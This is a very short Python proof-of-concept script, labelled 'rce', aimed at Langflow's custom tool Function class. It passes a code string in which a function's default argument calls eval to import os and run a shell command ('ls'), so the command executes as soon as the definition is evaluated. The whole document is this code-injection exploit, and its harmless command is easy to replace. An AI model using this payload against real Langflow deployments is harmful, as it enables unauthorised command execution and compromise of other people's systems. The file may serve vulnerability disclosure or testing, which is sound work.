import langflow

# rce

code = """
def x(y=eval('__import__("os").system("ls")')):
    pass
"""

target = langflow.interface.tools.custom.Function(code=code)